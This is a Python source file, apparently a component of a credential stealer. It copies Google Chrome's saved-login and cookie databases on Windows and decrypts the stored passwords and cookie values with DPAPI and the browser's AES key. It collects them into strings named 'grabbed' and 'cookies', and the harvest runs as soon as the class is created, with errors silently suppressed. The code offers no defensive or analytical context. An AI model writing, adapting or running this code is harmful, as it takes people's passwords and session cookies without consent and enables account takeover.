import sqlite3
import os
import json
import base64
import shutil
import ctypes
import ctypes.wintypes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)

APP_DATA = os.environ['LOCALAPPDATA']
DB_PATH  = 'Google\\Chrome\\User Data\\Default\\Login Data'
KEY_PATH = "Google\\Chrome\\User Data\\Local State"
NONCE_BYTE_SIZE = 12


class Chrome():
    def __init__(self):
        self.grabbed = ""
        self.cookies = ""
        self.query_chrome()

    def get_key(self):
        key = None
        with open(os.path.join(APP_DATA,
            KEY_PATH),encoding='utf-8',mode ="r") as f:
            key = json.loads(str(f.readline()))
        return key["os_crypt"]["encrypted_key"]

    def locate_db(self):
        full_path = os.path.join(APP_DATA, DB_PATH)
        temp_path = os.path.join(APP_DATA,'sqlite_file')
        if os.path.exists(temp_path): os.remove(temp_path)
        shutil.copyfile(full_path, temp_path)
        return full_path

    def locate_cookies(self):
        full_path = os.path.join(APP_DATA, 'Google\\Chrome\\User Data\\Default\\Cookies')
        temp_path = os.path.join(APP_DATA,'sqlite_file')
        if os.path.exists(full_path): os.remove(temp_path)
        shutil.copyfile(full_path, temp_path)
        return full_path


    def query_chrome(self):
        try:
            db = self.locate_db()
            db2 = shutil.copy(db, APP_DATA)
            conn = sqlite3.connect(db2)
            
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value  from logins")
            for item in cursor.fetchall():
                if item[0] != "":
                    self.grabbed += (f"{item[0]:<90}|{item[1]:<40}|{self.chrome_decrypt(item[2])}\n")

            dbc = self.locate_cookies()
            dbc2 = shutil.copy(dbc, APP_DATA)
            conn2 = sqlite3.connect(dbc2)
            cursor2 = conn2.cursor()
            cursor2.execute("SELECT host_key, name ,encrypted_value  from cookies")
            for newitem in cursor2.fetchall():
                if newitem[0] != "":
                    self.cookies += f"{newitem[0]:<30}|{newitem[1]}={self.chrome_decrypt(newitem[2])}\n"
        except:
            pass    


    def decrypt(self, cipher, ciphertext, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext)

    def get_cipher(self, key):
        cipher = Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )
        return cipher

    def chrome_decrypt(self,encrypted_txt):
        if encrypted_txt[:4] == b'\x01\x00\x00\x00':
            decrypted_txt = self.dpapi_decrypt(encrypted_txt)
            return decrypted_txt.decode()
        elif encrypted_txt[:3] == b'v10':
            decrypted_txt = self.aes_decrypt(encrypted_txt)
            return decrypted_txt[:-16].decode()

    def dpapi_decrypt(self, encrypted):

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        p = ctypes.create_string_buffer(encrypted, len(encrypted))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        retval = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if not retval:
            raise ctypes.WinError()
        result = ctypes.string_at(blobout.pbData, blobout.cbData)
        ctypes.windll.kernel32.LocalFree(blobout.pbData)
        return result

    def aes_decrypt(self, encrypted_txt):
        encoded_key = self.get_key()
        encrypted_key = base64.b64decode(encoded_key.encode())
        encrypted_key = encrypted_key[5:]
        key = self.dpapi_decrypt(encrypted_key)
        nonce = encrypted_txt[3:15]
        cipher = self.get_cipher(key)
        return self.decrypt(cipher,encrypted_txt[15:],nonce)

